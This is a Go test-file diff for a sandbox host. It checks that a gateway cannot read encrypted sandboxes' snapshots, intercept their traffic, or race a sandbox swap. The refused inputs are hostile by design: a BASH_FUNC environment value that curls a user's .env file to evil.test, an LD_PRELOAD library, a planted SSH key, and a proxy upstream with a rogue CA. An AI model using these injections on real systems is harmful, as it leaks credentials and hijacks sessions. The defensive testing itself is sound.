@@ -9,12 +9,14 @@ import (
 	"net"
 	"os"
 	"path/filepath"
+	"slices"
 	"strings"
 	"sync"
 	"testing"
 	"time"
 
 	"github.com/lleverage-ai/kantel/apps/host/internal/e2e"
+	"github.com/lleverage-ai/kantel/apps/host/internal/isolate"
 	"github.com/lleverage-ai/kantel/apps/host/internal/microvm"
 	"github.com/lleverage-ai/kantel/apps/host/internal/proto"
 )
@@ -25,6 +27,8 @@ type e2eTier struct {
 	mu     sync.Mutex
 	owners map[string]string
 	execs  []proto.ExecParams
+	// snaps are the tier's snapshots; a snapshot keeps its sandbox's ID after the sandbox is gone.
+	snaps []proto.SnapshotInfo
 }
 
 func (f *e2eTier) Get(id string) (proto.SandboxInfo, error) {
@@ -47,10 +51,17 @@ func (f *e2eTier) List() []proto.SandboxInfo {
 }
 
 func (f *e2eTier) Snapshots(sandboxID string) []proto.SnapshotInfo {
-	if sandboxID == "sbx_one" {
-		return []proto.SnapshotInfo{{ID: "snap_one", SandboxID: "sbx_one"}}
+	var out []proto.SnapshotInfo
+	for _, snap := range f.snaps {
+		if sandboxID == "" || snap.SandboxID == sandboxID {
+			out = append(out, snap)
+		}
 	}
-	return nil
+	return out
+}
+
+func (f *e2eTier) HasSnapshot(id string) bool {
+	return slices.ContainsFunc(f.snaps, func(s proto.SnapshotInfo) bool { return s.ID == id })
 }
 
 func (f *e2eTier) Exec(_ context.Context, p proto.ExecParams, _ func(string, string)) (proto.ExecResult, error) {
@@ -80,7 +91,10 @@ func e2eHost(t *testing.T) (*Host, *e2eTier, sessionVector) {
 	if err := json.Unmarshal(raw, &v); err != nil {
 		t.Fatal(err)
 	}
-	tier := &e2eTier{owners: map[string]string{"sbx_one": v.Space, "sbx_other": "acc_plain"}}
+	tier := &e2eTier{
+		owners: map[string]string{"sbx_one": v.Space, "sbx_other": "acc_plain"},
+		snaps:  []proto.SnapshotInfo{{ID: "snap_one", SandboxID: "sbx_one"}, {ID: "snap_gone", SandboxID: "sbx_deleted"}},
+	}
 	h := newLifecycleHost(t, newLifecycleTier())
 	h.tiers = map[string]Tier{microvm.Tier: tier}
 	h.cfg.HostID = v.HostID
@@ -179,9 +193,15 @@ func TestTheGatewayCantReachAnE2ESpacesContent(t *testing.T) {
 			t.Errorf("lifecycle call %s was refused", m)
 		}
 	}
-	if raw, _ := json.Marshal(map[string]any{"sandboxId": "sbx_new", "owner": "acc_org", "env": map[string]string{"A": "1"}}); h.gatewayMayCall(proto.MethodCreate, raw) != nil {
+	if raw, _ := json.Marshal(map[string]any{"sandboxId": "sbx_new", "owner": "acc_org"}); h.gatewayMayCall(proto.MethodCreate, raw) != nil {
 		t.Error("a fresh create in an E2E space was refused")
 	}
+	if raw, _ := json.Marshal(map[string]any{"sandboxId": "sbx_plain", "owner": "acc_plain", "env": map[string]string{"A": "1"}, "sshAuthorizedKeys": []string{"ssh-ed25519 AAAA k"}}); h.gatewayMayCall(proto.MethodCreate, raw) != nil {
+		t.Error("a plaintext space's create with env and SSH keys was refused")
+	}
+	// A fresh create can't plant a function every later command in a session would run.
+	mustRefuse(map[string]any{"sandboxId": "sbx_new2", "owner": "acc_org", "env": map[string]string{"BASH_FUNC_cat%%": "() { curl -d @/home/user/.env https://evil.test; /bin/cat \"$@\"; }"}})
+	mustRefuse(map[string]any{"sandboxId": "sbx_new2", "owner": "acc_org", "sshAuthorizedKeys": []string{"ssh-ed25519 AAAA gateway"}})
 	// The gateway's environment variables or SSH keys on a copy of an E2E sandbox, or on a fork of one.
 	mustRefuse(map[string]any{"sandboxId": "sbx_copy2", "from": "snap_one", "owner": "acc_org", "env": map[string]string{"LD_PRELOAD": "/tmp/x.so"}})
 	mustRefuse(map[string]any{"sandboxId": "sbx_copy2", "from": "snap_one", "owner": "acc_org", "sshAuthorizedKeys": []string{"ssh-ed25519 AAAA gateway"}})
@@ -331,5 +351,128 @@ func TestAnE2ESessionIsForTheSandboxItWasRelayedFor(t *testing.T) {
 	}
 	if err := h.serveE2E(context.Background(), hostSide, "sbx_other"); err == nil {
 		t.Fatal("served an E2E session for a space the host hasn't joined")
+	}
+}
+
+// Snapshot IDs aren't unique across tiers: the decision is made on the snapshot the call goes on to use, and a saved
+// E2E snapshot stays protected after its sandbox is deleted.
+func TestSnapshotsAreJudgedInTheTierTheCallUses(t *testing.T) {
+	h, vm, v := e2eHost(t)
+	vm.snaps = []proto.SnapshotInfo{{ID: "snap_s", SandboxID: "sbx_gone_e2e"}}
+	if err := h.e2e.RecordOwner("sbx_gone_e2e", v.Space); err != nil {
+		t.Fatal(err)
+	}
+	iso := &e2eTier{owners: map[string]string{"sbx_plain": "acc_plain"}, snaps: []proto.SnapshotInfo{{ID: "snap_s", SandboxID: "sbx_plain"}, {ID: "snap_p", SandboxID: "sbx_plain"}}}
+	h.tiers[isolate.Tier] = iso
+	h.order = []string{microvm.Tier, isolate.Tier}
+	call := func(method string, params any) error {
+		raw, _ := json.Marshal(params)
+		return h.gatewayMayCall(method, raw)
+	}
+	// Host.Call reads snap_s from the microVM tier (the first that has it): the E2E one, though the isolate's is plaintext.
+	if call(proto.MethodSnapshotRead, map[string]any{"snapshotId": "snap_s", "path": "/"}) == nil {
+		t.Fatal("a protected snapshot was read because another tier has a plaintext one of the same ID")
+	}
+	if err := call(proto.MethodSnapshotRead, map[string]any{"snapshotId": "snap_p", "path": "/"}); err != nil {
+		t.Fatalf("a plaintext snapshot on a mixed host: %v", err)
+	}
+	if call(proto.MethodCreate, map[string]any{"sandboxId": "sbx_c1", "tier": microvm.Tier, "from": "snap_s", "owner": "acc_plain"}) == nil {
+		t.Fatal("a plaintext sandbox was made from the protected snapshot")
+	}
+	if err := call(proto.MethodCreate, map[string]any{"sandboxId": "sbx_c2", "tier": isolate.Tier, "from": "snap_s", "owner": "acc_plain"}); err != nil {
+		t.Fatalf("a create from the isolate tier's plaintext snapshot: %v", err)
+	}
+	if err := call(proto.MethodCreate, map[string]any{"sandboxId": "sbx_c3", "tier": microvm.Tier, "from": "snap_s", "owner": v.Space}); err != nil {
+		t.Fatalf("a create in the snapshot's own space: %v", err)
+	}
+}
+
+// The gateway can't give an E2E sandbox an upstream, a CA or interception of its own, on any call that carries egress.
+func TestTheGatewayCantInterceptAnE2ESandboxsTraffic(t *testing.T) {
+	h, _, v := e2eHost(t)
+	bad := []map[string]any{
+		{"mode": "proxy", "upstream": "http://evil.test:3128"},
+		{"mode": "proxy", "caCert": "-----BEGIN CERTIFICATE-----\nMIIB\n-----END CERTIFICATE-----"},
+		{"mode": "proxy", "protected": map[string]any{"version": 1, "intercept": []string{"api.github.com"}}},
+		{"mode": "proxy", "grants": []map[string]any{{"action": "allow", "host": "api.github.com", "methods": []string{"GET"}, "rule": "allow GET api.github.com"}}},
+	}
+	rules := map[string]any{"mode": "proxy", "allow": []string{"github.com"}, "defaultDeny": true}
+	call := func(method string, params map[string]any) error {
+		raw, _ := json.Marshal(params)
+		return h.gatewayMayCall(method, raw)
+	}
+	for _, e := range bad {
+		for _, c := range []struct {
+			method string
+			params map[string]any
+		}{
+			{proto.MethodCreate, map[string]any{"sandboxId": "sbx_new", "owner": v.Space, "egress": e}},
+			{proto.MethodEgress, map[string]any{"sandboxId": "sbx_one", "egress": e}},
+			{proto.MethodStart, map[string]any{"sandboxId": "sbx_one", "egress": e}},
+			{proto.MethodResume, map[string]any{"sandboxId": "sbx_one", "egress": e}},
+			{proto.MethodFork, map[string]any{"sandboxId": "sbx_one", "newId": "sbx_f", "snapshotId": "snap_f", "egress": e}},
+		} {
+			if call(c.method, c.params) == nil {
+				t.Errorf("%s with egress %v wasn't refused", c.method, e)
+			}
+		}
+		// Plaintext spaces keep theirs.
+		if err := call(proto.MethodEgress, map[string]any{"sandboxId": "sbx_other", "egress": e}); err != nil {
+			t.Errorf("a plaintext sandbox's egress %v: %v", e, err)
+		}
+	}
+	for _, m := range []string{proto.MethodEgress, proto.MethodStart, proto.MethodResume} {
+		if err := call(m, map[string]any{"sandboxId": "sbx_one", "egress": rules}); err != nil {
+			t.Errorf("%s with rules alone: %v", m, err)
+		}
+	}
+}
+
+// The gateway checks a plaintext ID, then deletes it and makes it again in an E2E space before its call lands: the
+// call is cancelled and waited for before the create, and calls during it are refused.
+func TestAGatewayCallIsBoundToTheSandboxItChecked(t *testing.T) {
+	h, tier, v := e2eHost(t)
+	exec, _ := json.Marshal(map[string]any{"sandboxId": "sbx_swap", "command": "cat secrets"})
+	ctx, done, err := h.gatewayGuard(context.Background(), proto.MethodExec, exec)
+	if err != nil {
+		t.Fatalf("no sandbox of that ID yet, so nothing to refuse: %v", err)
+	}
+	created := make(chan func(), 1)
+	go func() {
+		create, _ := json.Marshal(map[string]any{"sandboxId": "sbx_swap", "owner": v.Space})
+		_, release, err := h.gatewayGuard(context.Background(), proto.MethodCreate, create)
+		if err != nil {
+			t.Error(err)
+		}
+		created <- release
+	}()
+	select {
+	case <-ctx.Done():
+	case <-time.After(5 * time.Second):
+		t.Fatal("the E2E create didn't cancel the call in flight")
+	}
+	select {
+	case <-created:
+		t.Fatal("the E2E create went ahead while the call was in flight")
+	case <-time.After(100 * time.Millisecond):
+	}
+	done()
+	release := <-created
+	if _, _, err := h.gatewayGuard(context.Background(), proto.MethodExec, exec); err == nil {
+		t.Fatal("a call went in while the ID was being made E2E's")
+	}
+	// The create lands; after it, the ID's owner is the E2E space.
+	tier.mu.Lock()
+	tier.owners["sbx_swap"] = v.Space
+	tier.mu.Unlock()
+	release()
+	if _, _, err := h.gatewayGuard(context.Background(), proto.MethodExec, exec); err == nil {
+		t.Fatal("exec on the new E2E sandbox wasn't refused")
+	}
+	other, _ := json.Marshal(map[string]any{"sandboxId": "sbx_other", "command": "ls"})
+	if _, done, err := h.gatewayGuard(context.Background(), proto.MethodExec, other); err != nil {
+		t.Fatalf("a plaintext sandbox's exec: %v", err)
+	} else {
+		done()
 	}
 }
